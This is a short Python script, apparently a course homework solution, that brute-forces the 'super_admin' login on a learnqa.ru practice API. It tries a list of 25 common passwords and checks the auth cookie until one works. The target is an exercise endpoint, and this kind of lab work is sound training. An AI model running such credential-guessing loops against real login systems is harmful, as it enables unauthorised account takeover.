import requests

creds = {'login': 'super_admin'}
top_25_passwords = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345',
                    'iloveyou', '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin',
                    'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome', '888888',
                    'princess', 'dragon', 'password1', '123qwe']

url_for_get_password = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_for_check_password = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

for password in top_25_passwords:
    creds['password'] = password
    response = requests.post(url_for_get_password, json=creds)
    cookie = response.cookies

    response = requests.get(url_for_check_password, cookies=cookie)
    if response.text == 'You are authorized':
        print(f'Верный пароль: {creds['password']}')
